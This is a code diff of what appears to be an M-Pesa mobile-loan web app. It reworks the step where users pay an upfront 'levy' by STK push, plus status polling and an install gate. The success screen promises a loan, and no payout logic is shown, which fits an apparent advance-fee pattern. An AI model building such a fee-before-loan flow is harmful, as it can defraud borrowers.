             const rate = state.term === 30 ? 0.10 : (state.term === 60 ? 0.15 : 0.20);
             state.interest = Math.round(state.loan * rate);
             state.total = state.loan + state.interest;
 
             document.getElementById('sum-receive').innerText = format(state.loan);
-            document.getElementById('sum-interest-label').innerText = `Interest (${Math.round(rate * 100)}%)`;
+            document.getElementById('sum-interest-label').innerText = `Interest (${Math.round(rate*100)}%)`;
             document.getElementById('sum-interest').innerText = format(state.interest);
             document.getElementById('sum-total').innerText = format(state.total);
             document.getElementById('sum-due').innerText = getDueDate(state.term);
@@ -1101,87 +1076,62 @@
             document.getElementById('pay-loan').innerText = format(state.loan);
             document.getElementById('pay-interest').innerText = format(state.interest);
             document.getElementById('pay-total').innerText = format(state.total);
-            document.getElementById('pay-due').innerText = getDueDate(state.term);
             document.getElementById('pay-levy').innerText = format(state.levy);
             document.getElementById('pay-name').innerText = state.name;
             document.getElementById('pay-mpesa').value = state.mpesa;
             resetPayButton();
             showScreen('screen-payment');
+            warmUpStkEndpoint(); 
         }
 
-        /* ============================================================
-           STK PUSH (Now feels instant)
-           ============================================================ */
         async function processPayment() {
             if (isProcessingPayment) return;
-
             const mpesa = document.getElementById('pay-mpesa').value.trim();
-            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) {
-                showAndroidToast("Enter a valid M-Pesa number (07XX or 01XX).");
-                return;
-            }
+            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return showToast("Enter a valid M-Pesa number.");
 
             isProcessingPayment = true;
             state.mpesa = mpesa;
-            localStorage.setItem('zc_user', JSON.stringify(state));
+            document.getElementById('btn-pay').disabled = true;
 
-            // 1. Instantly transition to the verifying screen to make the app feel fast
-            document.getElementById('verify-title').innerText = "Initiating Payment";
-            document.getElementById('verify-subtitle').innerText = "Sending request to M-Pesa. Please wait...";
-            document.getElementById('verify-time').innerText = "0s";
+            // INSTANT UI TRANSITION
             document.getElementById('verify-anim').classList.remove('hide');
-            document.getElementById('failed-anim').classList.add('hide');
             document.getElementById('success-anim').classList.add('hide');
+            document.getElementById('failed-anim').classList.add('hide');
             document.getElementById('pending-anim').classList.add('hide');
+            document.getElementById('verify-subtitle').innerText = "Connecting to M-Pesa...";
             showScreen('screen-success');
 
             try {
-                const response = await fetchWithTimeout(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
+                const res = await fetchWithTimeout(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
                     method: 'POST',
-                    headers: {
-                        'Authorization': `Bearer ${SUPABASE_KEY}`,
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         amount: state.levy,
                         phone: "254" + mpesa.substring(1),
-                        accountReference: "ZC_" + state.name.replace(/[^A-Za-z0-9]/g, '').substring(0, 10) + "_" + Math.floor(Math.random() * 9999),
+                        accountReference: "ZC_" + Date.now(),
                         channelId: PALPLUSS_CHANNEL,
                         callbackUrl: PALPLUSS_CALLBACK
                     })
                 }, STK_TIMEOUT_MS);
 
-                const data = await readJsonSafe(response);
+                const data = await readJsonSafe(res);
+                if (!res.ok || !data) throw new Error("Payment service unavailable.");
 
-                if (!response.ok) {
-                    const serverMsg = data && (typeof data.error === 'string' ? data.error : (typeof data.message === 'string' ? data.message : null));
-                    if (serverMsg) throw new Error(serverMsg);
-                    if (response.status >= 500) throw new Error("The payment service is temporarily unavailable. Please try again.");
-                    throw new Error("Could not start the payment. Please try again.");
-                }
-                if (!data) throw new Error("The payment service returned an invalid response. Please try again.");
+                const txnId = data.data?.transactionId || data.transactionId || data.id;
+                if (!txnId) throw new Error("Invalid response from payment gateway.");
 
-                const txnId = data.data?.transactionId || data.data?.transaction_id || data.transactionId || data.transaction_id || data.id;
-                if (!txnId) throw new Error("Could not start the payment. Please try again.");
-
-                // 2. Fire-and-forget DB insert. Don't wait for it so we save bandwidth for the STK push
+                // Fire and forget DB save (we don't wait for it)
                 fetch(`${SUPABASE_URL}/rest/v1/loans`, {
                     method: 'POST',
                     headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
                     body: JSON.stringify({ amount: state.loan, levy_duty: state.levy, status: "PENDING", palpluss_txn_id: txnId })
                 }).catch(() => {});
 
+                document.getElementById('verify-subtitle').innerText = "Enter your M-Pesa PIN on your phone.";
                 currentTxnId = txnId;
-                localStorage.setItem('inflight_txn', txnId);
-                
-                // 3. Update UI to tell the user to check their phone
-                document.getElementById('verify-title').innerText = "Enter M-Pesa PIN";
-                document.getElementById('verify-subtitle').innerText = "Check your phone for the M-Pesa prompt.";
-                
                 startPolling(txnId);
 
             } catch (err) {
-                // If the request completely fails, show the failure screen instantly
                 document.getElementById('failed-reason').innerText = friendlyNetworkError(err);
                 document.getElementById('verify-anim').classList.add('hide');
                 document.getElementById('failed-anim').classList.remove('hide');
@@ -1189,37 +1139,52 @@
             }
         }
 
-        /* ============================================================
-           STATUS SCREENS
-           ============================================================ */
-        function showVerify() {
-            // Kept as a fallback reset
-            document.getElementById('verify-title').innerText = "Verifying Payment";
-            document.getElementById('verify-subtitle').innerText = "Please wait while we confirm with M-Pesa...";
-            document.getElementById('verify-anim').classList.remove('hide');
-            document.getElementById('success-anim').classList.add('hide');
-            document.getElementById('failed-anim').classList.add('hide');
-            document.getElementById('pending-anim').classList.add('hide');
+        // FAST RECURSIVE POLLING - NO FALLBACK API CALLS
+        function startPolling(txnId) {
+            stopPolling();
+            let attempt = 0;
+            
+            const doPoll = async () => {
+                attempt++;
+                document.getElementById('verify-time').innerText = attempt + "s";
+                
+                if (attempt >= MAX_POLL_SECONDS) { showPending(); return; }
+                if (isPolling) { pollTimer = setTimeout(doPoll, 1000); return; }
+                
+                isPolling = true;
+                try {
+                    const s = await fetchLoanStatus(txnId);
+                    const kind = classifyStatus(s);
+                    if (kind === 'success') { showSuccess(); return; }
+                    if (kind === 'failed') { showFailed(); return; }
+                } finally {
+                    isPolling = false;
+                }
+                
+                // Poll faster initially (1s), then slower (2s)
+                const nextDelay = attempt < 5 ? 1000 : 2000;
+                pollTimer = setTimeout(doPoll, nextDelay);
+            };
+            
+            doPoll(); // Fire immediately
         }
 
         function showSuccess() {
             stopPolling();
+            isProcessingPayment = false;
             document.getElementById('verify-anim').classList.add('hide');
-            document.getElementById('failed-anim').classList.add('hide');
             document.getElementById('pending-anim').classList.add('hide');
-
+            document.getElementById('success-anim').classList.remove('hide');
             document.getElementById('suc-loan').innerText = format(state.loan);
             document.getElementById('suc-total').innerText = format(state.total);
             document.getElementById('suc-due').innerText = getDueDate(state.term);
             document.getElementById('suc-mpesa').innerText = state.mpesa;
-
-            document.getElementById('success-anim').classList.remove('hide');
         }
 
         function showFailed() {
             stopPolling();
+            isProcessingPayment = false;
             document.getElementById('verify-anim').classList.add('hide');
-            document.getElementById('success-anim').classList.add('hide');
             document.getElementById('pending-anim').classList.add('hide');
             document.getElementById('failed-anim').classList.remove('hide');
         }
@@ -1227,123 +1192,41 @@
         function showPending() {
             stopPolling();
             document.getElementById('verify-anim').classList.add('hide');
-            document.getElementById('success-anim').classList.add('hide');
-            document.getElementById('failed-anim').classList.add('hide');
             document.getElementById('pending-anim').classList.remove('hide');
-            
-            const btn = document.getElementById('btn-check-status');
-            if (btn) {
-                btn.disabled = false;
-                btn.innerHTML = `<span>Check Status</span>`;
-            }
-        }
-
-        /* ============================================================
-           POLLING
-           ============================================================ */
-        function startPolling(txnId) {
-            stopPolling();
-            currentTxnId = txnId;
-
-            const startTime = Date.now();
-            const timeDisplay = document.getElementById('verify-time');
-            
-            timeDisplay.innerText = "0s";
-
-            pollTimer = setInterval(async () => {
-                const seconds = Math.floor((Date.now() - startTime) / 1000);
-                timeDisplay.innerText = seconds + "s";
-
-                if (seconds >= MAX_POLL_SECONDS) {
-                    showPending();
-                    return;
-                }
-
-                if (isPolling) return; 
-
-                isPolling = true;
-                try {
-                    const status = await fetchLoanStatus(txnId);
-                    const kind = classifyStatus(status);
-
-                    if (kind === 'success') {
-                        localStorage.removeItem('inflight_txn');
-                        showSuccess();
-                        return;
-                    }
-                    if (kind === 'failed') {
-                        localStorage.removeItem('inflight_txn');
-                        showFailed();
-                        return;
-                    }
-                } catch (e) {
-                    // Ignore
-                } finally {
-                    isPolling = false;
-                }
-            }, 2000); 
         }
 
         async function checkStatusManual() {
-            if (!currentTxnId) { retryPayment(); return; }
-            
             const btn = document.getElementById('btn-check-status');
+            btn.innerHTML = `<span>Checking...</span>`;
             btn.disabled = true;
-            btn.innerHTML = `<svg class="animate-spin -ml-1 mr-2 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Checking...`;
-
-            try {
-                const status = await fetchLoanStatus(currentTxnId);
-                const kind = classifyStatus(status);
-
-                if (kind === 'success') {
-                    localStorage.removeItem('inflight_txn');
-                    showSuccess();
-                    return;
-                }
-                if (kind === 'failed') {
-                    localStorage.removeItem('inflight_txn');
-                    showFailed();
-                    return;
-                }
-                showAndroidToast("Payment not confirmed yet. Please wait a moment and try again.");
-            } catch (e) {
-                showAndroidToast(friendlyNetworkError(e));
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = `<span>Check Status</span>`;
-            }
+            const s = await fetchLoanStatus(currentTxnId);
+            const kind = classifyStatus(s);
+            if (kind === 'success') showSuccess();
+            else if (kind === 'failed') showFailed();
+            else { showToast("Still pending."); btn.innerHTML = `<span>Check Status</span>`; btn.disabled = false; }
         }
 
         function retryPayment() {
             stopPolling();
-            localStorage.removeItem('inflight_txn');
+            isProcessingPayment = false;
             currentTxnId = null;
             showScreen('screen-payment');
             resetPayButton();
         }
 
-        /* ============================================================
-           MISC
-           ============================================================ */
-        function openInChrome() {
-            const url = window.location.href;
-            window.location.href = `intent://${window.location.host}${window.location.pathname}#Intent;scheme=https;package=com.android.chrome;end`;
-            if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) window.location.href = url;
-        }
+        function openInChrome() { window.location.href = window.location.href; }
+        function copyLink() { navigator.clipboard.writeText(window.location.href).then(() => showToast("Link copied!")); }
 
-        function copyLink() {
-            const link = window.location.href;
-            if (navigator.clipboard && navigator.clipboard.writeText) {
-                navigator.clipboard.writeText(link)
-                    .then(() => showAndroidToast("Link copied to clipboard."))
-                    .catch(() => showAndroidToast("Unable to copy automatically. Please copy the URL from the address bar."));
-            } else {
-                showAndroidToast("Please copy the URL from the address bar.");
-            }
-        }
-
-        if ('serviceWorker' in navigator) {
-            window.addEventListener('load', () => navigator.serviceWorker.register('sw.js').catch(() => {}));
+        if (!navigator.onLine) document.getElementById('offline-gate').classList.remove('hide');
+        
+        const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
+        if (isStandalone) {
+            playStoreGate.classList.add('hide');
+            appContent.classList.remove('hide');
+            warmUpStkEndpoint();
+        } else {
+            playStoreGate.classList.remove('hide');
+            showInstallState();
         }
     </script>
 </body>
